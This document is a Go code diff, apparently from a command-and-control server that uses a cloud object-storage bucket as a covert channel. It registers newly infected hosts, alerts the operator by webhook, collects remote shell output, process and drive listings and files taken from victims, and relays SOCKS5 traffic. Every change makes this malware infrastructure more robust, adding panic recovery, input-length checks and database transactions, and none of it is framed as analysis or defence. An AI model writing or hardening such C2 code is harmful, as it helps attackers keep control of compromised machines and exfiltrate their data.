@@ -72,6 +72,25 @@ var (
 	globalOSSStats = &OSSStats{}
 )
 
+// 安全分割OS信息函数
+func safeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
+	if osInfo == "" {
+		return "Unknown", "Unknown", "Unknown"
+	}
+
+	parts := strings.SplitN(osInfo, "\t", 3)
+	switch len(parts) {
+	case 3:
+		return parts[0], parts[1], parts[2]
+	case 2:
+		return parts[0], parts[1], "Unknown"
+	case 1:
+		return parts[0], "Unknown", "Unknown"
+	default:
+		return "Unknown", "Unknown", "Unknown"
+	}
+}
+
 // NewOSSClient 创建新的OSS客户端
 func NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName string, stopchan chan struct{}) *OSSClient {
 	return &OSSClient{
@@ -92,6 +111,12 @@ func NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName string, sto
 
 // HandleOSSConnection 处理OSS连接（优化版）
 func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName string, stopchan chan struct{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("OSS connection handler panic recovered:", r)
+		}
+	}()
+
 	// 创建客户端
 	client := NewOSSClient(endpoint, accessKeyID, accessKeySecret, bucketName, stopchan)
 
@@ -132,6 +157,12 @@ func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName stri
 
 // processLoop 处理循环
 func (c *OSSClient) processLoop() {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("OSS process loop panic recovered:", r)
+		}
+	}()
+
 	// 指数退避参数
 	backoffFactor := 1
 	maxBackoff := 32
@@ -212,6 +243,12 @@ func (c *OSSClient) pollMessages() ([]string, error) {
 
 // processMessages 处理消息
 func (c *OSSClient) processMessages(keys []string) {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("OSS process messages panic recovered:", r)
+		}
+	}()
+
 	// 使用工作池处理消息
 	semaphore := make(chan struct{}, c.Config.MaxWorkers)
 	var wg sync.WaitGroup
@@ -227,6 +264,16 @@ func (c *OSSClient) processMessages(keys []string) {
 		go func(k string) {
 			defer wg.Done()
 			defer func() { <-semaphore }()
+
+			defer func() {
+				if r := recover(); r != nil {
+					logger.Error("OSS message processing panic recovered:", r, "key:", k)
+					c.Stats.mu.Lock()
+					c.Stats.FailedMessages++
+					c.Stats.LastError = fmt.Sprintf("panic: %v", r)
+					c.Stats.mu.Unlock()
+				}
+			}()
 
 			// 重试机制
 			for attempt := 0; attempt <= c.Config.RetryCount; attempt++ {
@@ -258,6 +305,9 @@ func (c *OSSClient) processMessages(keys []string) {
 func (c *OSSClient) processSingleMessage(key string) error {
 	// 获取消息内容
 	message := Get(Service, key)
+	if message == nil {
+		return fmt.Errorf("empty message for key: %s", key)
+	}
 
 	// 删除已处理的消息
 	Del(Service, key)
@@ -268,8 +318,14 @@ func (c *OSSClient) processSingleMessage(key string) error {
 
 // processMessage 处理消息内容
 func processMessage(message []byte) error {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Process message panic recovered:", r)
+		}
+	}()
+
 	if len(message) < 4 {
-		return fmt.Errorf("message too short")
+		return fmt.Errorf("message too short: %d bytes", len(message))
 	}
 
 	msgTypeBytes := message[:4]
@@ -277,8 +333,14 @@ func processMessage(message []byte) error {
 
 	switch msgType {
 	case 1: // firstBlood
+		if len(message) < 5 {
+			return fmt.Errorf("firstBlood message too short: %d bytes", len(message))
+		}
 		return handleFirstBlood(message[4:])
 	case 2: // otherMsg
+		if len(message) < 8 {
+			return fmt.Errorf("otherMsg message too short: %d bytes", len(message))
+		}
 		return handleOtherMsg(message[4:])
 	default:
 		return fmt.Errorf("unknown message type: %d", msgType)
@@ -287,6 +349,16 @@ func processMessage(message []byte) error {
 
 // handleFirstBlood 处理首次连接
 func handleFirstBlood(msg []byte) error {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Handle firstBlood panic recovered:", r)
+		}
+	}()
+
+	if len(msg) == 0 {
+		return fmt.Errorf("empty firstBlood payload")
+	}
+
 	tmpMetainfo, err := encrypt.DecodeBase64(msg)
 	if err != nil {
 		return fmt.Errorf("decode base64 failed: %w", err)
@@ -297,7 +369,17 @@ func handleFirstBlood(msg []byte) error {
 		return fmt.Errorf("decrypt failed: %w", err)
 	}
 
+	// 验证metainfo长度
+	if len(metainfo) < 9 {
+		return fmt.Errorf("metainfo too short: %d bytes", len(metainfo))
+	}
+
 	uid := encrypt.BytesToMD5(metainfo)
+
+	// 验证UID
+	if len(uid) == 0 {
+		return fmt.Errorf("invalid UID generated")
+	}
 
 	// 更新连接类型
 	connection.MuClientListenerType.Lock()
@@ -309,16 +391,30 @@ func handleFirstBlood(msg []byte) error {
 	exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)
 
 	if !exists {
+		// 安全解析数据
+		if len(metainfo) < 9 {
+			return fmt.Errorf("metainfo insufficient for parsing: %d bytes", len(metainfo))
+		}
+
 		processID := binary.BigEndian.Uint32(metainfo[:4])
-		flag := int(metainfo[4:5][0])
+		flag := int(metainfo[4])
+
+		// 验证IP数据
+		if len(metainfo) < 9 {
+			return fmt.Errorf("metainfo too short for IP: %d bytes", len(metainfo))
+		}
+
 		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
 		localIP := utils.Uint32ToIP(ipInt).String()
-		osInfo := string(metainfo[9:])
 
-		osArray := strings.Split(osInfo, "\t")
-		hostName := osArray[0]
-		UserName := osArray[1]
-		processName := osArray[2]
+		// 安全获取osInfo
+		var osInfo string
+		if len(metainfo) > 9 {
+			osInfo = string(metainfo[9:])
+		}
+
+		// 使用安全分割函数
+		hostName, UserName, processName := safeSplitOSInfo(osInfo)
 
 		externalIp := "oss上线"
 		address := "oss上线"
@@ -329,12 +425,24 @@ func handleFirstBlood(msg []byte) error {
 
 		arch := "x86"
 
+		// 处理flag标志位
 		if flag > 8 {
 			UserName += "*"
 			flag = flag - 8
 		}
 		if flag > 4 {
 			arch = "x64"
+		}
+
+		// 验证数据有效性
+		if processName == "" {
+			processName = "Unknown"
+		}
+		if hostName == "" {
+			hostName = "Unknown"
+		}
+		if UserName == "" {
+			UserName = "Unknown"
 		}
 
 		// 使用事务插入
@@ -382,11 +490,17 @@ func handleFirstBlood(msg []byte) error {
 		}
 
 		// 发送Webhook通知
-		if exits, key := webhooks.CheckEnable(); exits {
+		if exists, key := webhooks.CheckEnable(); exists {
 			webhooks.SendWecom(c, key)
 		}
 
 		logger.Info("New OSS client registered:", uid)
+	} else {
+		// 更新在线状态
+		if _, err := database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"}); err != nil {
+			logger.Error("Failed to update client status:", err)
+		}
+		logger.Info("OSS client reconnected:", uid)
 	}
 
 	return nil
@@ -394,17 +508,38 @@ func handleFirstBlood(msg []byte) error {
 
 // handleOtherMsg 处理其他消息
 func handleOtherMsg(msg []byte) error {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Handle otherMsg panic recovered:", r)
+		}
+	}()
+
 	if len(msg) < 4 {
-		return fmt.Errorf("otherMsg too short")
+		return fmt.Errorf("otherMsg too short: %d bytes", len(msg))
 	}
 
 	metaLen := binary.BigEndian.Uint32(msg[:4])
+
+	// 验证metaLen的合理性
+	if metaLen > uint32(len(msg)-4) {
+		return fmt.Errorf("invalid meta length: %d, available: %d", metaLen, len(msg)-4)
+	}
+
+	if metaLen == 0 {
+		return fmt.Errorf("zero meta length")
+	}
+
 	if len(msg) < int(4+metaLen) {
-		return fmt.Errorf("invalid meta length")
+		return fmt.Errorf("message too short for meta: %d bytes", len(msg))
 	}
 
 	metaMsg := msg[4 : 4+metaLen]
 	realMsg := msg[4+metaLen:]
+
+	// 验证realMsg不为空
+	if len(realMsg) == 0 {
+		return fmt.Errorf("empty real message")
+	}
 
 	tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
 	if err != nil {
@@ -417,6 +552,11 @@ func handleOtherMsg(msg []byte) error {
 	}
 
 	uid := encrypt.BytesToMD5(metainfo)
+
+	// 验证UID
+	if len(uid) == 0 {
+		return fmt.Errorf("invalid UID generated")
+	}
 
 	dataBytes, err := encrypt.DecodeBase64(realMsg)
 	if err != nil {
@@ -433,8 +573,9 @@ func handleOtherMsg(msg []byte) error {
 		return fmt.Errorf("second decrypt failed: %w", err)
 	}
 
+	// 严格检查dataBytes长度
 	if len(dataBytes) < 4 {
-		return fmt.Errorf("decrypted data too short")
+		return fmt.Errorf("decrypted data too short: %d bytes", len(dataBytes))
 	}
 
 	replyTypeBytes := dataBytes[:4]
@@ -445,34 +586,68 @@ func handleOtherMsg(msg []byte) error {
 	case 0: // 命令行展示
 		var shell database.Shell
 		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
-			shell.ShellContent += string(data) + "\n"
+			// 限制数据长度，防止过大的日志
+			var content string
+			if len(data) > 10000 {
+				content = string(data[:10000]) + "\n[Data truncated...]"
+			} else {
+				content = string(data) + "\n"
+			}
+
+			shell.ShellContent += content
 			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
 				logger.Error("Failed to update shell:", err)
+				return fmt.Errorf("update shell failed: %w", err)
 			}
 		}
 
 	case 31: // 错误展示
 		var shell database.Shell
 		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
-			shell.ShellContent += "!Error: " + string(data) + "\n"
+			// 限制数据长度，防止过大的日志
+			var content string
+			if len(data) > 10000 {
+				content = string(data[:10000]) + "\n[Data truncated...]"
+			} else {
+				content = string(data)
+			}
+
+			shell.ShellContent += "!Error: " + content + "\n"
 			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
 				logger.Error("Failed to update shell:", err)
+				return fmt.Errorf("update shell failed: %w", err)
 			}
 		}
 
 	case command.PS:
-		command.VarPidQueue.Add(uid, string(data))
+		if len(data) > 0 {
+			command.VarPidQueue.Add(uid, string(data))
+		}
 
 	case command.FileBrowse:
-		command.VarFileBrowserQueue.Add(uid, string(data))
+		if len(data) > 0 {
+			command.VarFileBrowserQueue.Add(uid, string(data))
+		}
 
 	case 22: // 文件下载第一条信息
-		if len(data) < 4 {
-			return fmt.Errorf("file download info too short")
+		if len(data) < 8 { // 至少4字节长度+部分路径
+			return fmt.Errorf("file download info too short: %d bytes", len(data))
 		}
 
 		fileLen := int(binary.BigEndian.Uint32(data[:4]))
+		if len(data) < 5 { // 至少4字节长度+1字节路径
+			return fmt.Errorf("no file path in download info")
+		}
+
 		filePath := string(data[4:])
+		if filePath == "" {
+			return fmt.Errorf("empty file path")
+		}
+
+		// 验证文件长度合理性
+		if fileLen <= 0 {
+			return fmt.Errorf("invalid file length: %d", fileLen)
+		}
 
 		// 使用安全路径函数
 		fullPath, err := utils.GetSafeFilePath(uid, filePath)
@@ -494,6 +669,7 @@ WHERE uid = ? AND file_path = ?;
 `
 		if _, err := database.Engine.QueryString(sql, fileLen, 0, uid, filePath); err != nil {
 			logger.Error("Database update failed:", err)
+			return fmt.Errorf("database update failed: %w", err)
 		}
 
 		// 检查并删除已存在的文件
@@ -511,13 +687,18 @@ WHERE uid = ? AND file_path = ?;
 		fp.Close()
 
 	case command.DOWNLOAD: // 文件下载
-		if len(data) < 4 {
-			return fmt.Errorf("download data too short")
+		if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
+			return fmt.Errorf("download data too short: %d bytes", len(data))
 		}
 
 		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
 		if len(data) < 4+filePathLen {
-			return fmt.Errorf("invalid file path length in download")
+			return fmt.Errorf("invalid file path length in download: %d, available: %d",
+				filePathLen, len(data)-4)
+		}
+
+		if filePathLen == 0 {
+			return fmt.Errorf("zero file path length")
 		}
 
 		filePath := string(data[4 : 4+filePathLen])
@@ -529,12 +710,26 @@ WHERE uid = ? AND file_path = ?;
 			return fmt.Errorf("security check failed: %w", err)
 		}
 
+		// 使用事务更新数据库
+		session := database.Engine.NewSession()
+		if err := session.Begin(); err != nil {
+			logger.Error("Failed to start transaction:", err)
+			return fmt.Errorf("begin transaction failed: %w", err)
+		}
+
 		var fileDownloads database.Downloads
-		if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
+		if _, err := session.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
 			fileDownloads.DownloadedSize += len(fileContent)
-			if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads); err != nil {
-				logger.Error("Failed to update download record:", err)
+			if _, err := session.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads); err != nil {
+				session.Rollback()
+				logger.Error("Failed to update downloads:", err)
+				return fmt.Errorf("update downloads failed: %w", err)
 			}
+		}
+
+		if err := session.Commit(); err != nil {
+			logger.Error("Failed to commit transaction:", err)
+			return fmt.Errorf("commit transaction failed: %w", err)
 		}
 
 		// 确保目录存在
@@ -555,17 +750,24 @@ WHERE uid = ? AND file_path = ?;
 		}
 
 	case command.DRIVES:
-		drives := utils.GetExistingDrives(data)
-		command.VarDrivesQueue.Add(uid, drives)
+		if len(data) > 0 {
+			drives := utils.GetExistingDrives(data)
+			command.VarDrivesQueue.Add(uid, drives)
+		}
 
 	case command.FileContent:
-		if len(data) < 4 {
-			return fmt.Errorf("file content data too short")
+		if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
+			return fmt.Errorf("file content data too short: %d bytes", len(data))
 		}
 
 		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
 		if len(data) < 4+filePathLen {
-			return fmt.Errorf("invalid file path length in file content")
+			return fmt.Errorf("invalid file path length in file content: %d, available: %d",
+				filePathLen, len(data)-4)
+		}
+
+		if filePathLen == 0 {
+			return fmt.Errorf("zero file path length")
 		}
 
 		filePath := string(data[4 : 4+filePathLen])
@@ -574,7 +776,7 @@ WHERE uid = ? AND file_path = ?;
 
 	case command.Socks5Data:
 		if len(data) < 16 {
-			return fmt.Errorf("socks5 data too short")
+			return fmt.Errorf("socks5 data too short: %d bytes", len(data))
 		}
 
 		md5sign := data[:16]
@@ -591,6 +793,12 @@ WHERE uid = ? AND file_path = ?;
 // monitor 监控协程
 func (c *OSSClient) monitor() {
 	defer c.Wg.Done()
+
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("OSS monitor panic recovered:", r)
+		}
+	}()
 
 	ticker := time.NewTicker(30 * time.Second)
 	defer ticker.Stop()
@@ -615,6 +823,12 @@ func (c *OSSClient) monitor() {
 
 // cleanupStaleClients 清理过期的客户端
 func (c *OSSClient) cleanupStaleClients() {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Cleanup stale clients panic recovered:", r)
+		}
+	}()
+
 	processedMu.Lock()
 	defer processedMu.Unlock()
 
@@ -646,6 +860,12 @@ func StopOSSClient(endpoint, accessKeyID, bucketName string) {
 
 // CleanupAllOSS 清理所有OSS客户端
 func CleanupAllOSS() {
+	defer func() {
+		if r := recover(); r != nil {
+			logger.Error("Cleanup all OSS panic recovered:", r)
+		}
+	}()
+
 	ossManagerMu.Lock()
 	defer ossManagerMu.Unlock()
 
